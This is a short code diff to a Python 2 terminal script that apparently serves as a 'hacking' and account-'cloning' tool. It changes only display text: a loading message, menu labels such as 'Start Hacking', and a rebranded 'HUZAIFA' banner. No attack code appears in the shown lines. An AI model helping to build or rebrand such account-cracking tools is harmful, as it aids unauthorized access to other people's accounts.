@@ -64,7 +64,7 @@ logo = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[●] \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -194,8 +194,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m◙Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m◙Update Aahil"																														
+	print "\033[1;32;40m[1] \033[1;33;40m◙Start Hacking"	
+	print "\033[1;32;40m[2] \033[1;33;40m◙Update Huzaifa"																														
 	print "\033[1;32;40m[0] \033[1;33;40m◙Log out"
 	pilih()
 
@@ -300,9 +300,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●╬─────────────────♛HUZAIFA♛─────────────────╬"
+	print "   \033[1;31;48m╬─────────────────♛HUZAIFA♛─────────────────╬"
 
-	jalan('              \033[1;91mPlease Wait...')
+	jalan('                         \033[1;91mPlease Wait...')
 	print  "  \033[1;36;48m╬─────────────────♛HUZAIFA♛─────────────────╬" 
 
 	def main(arg):
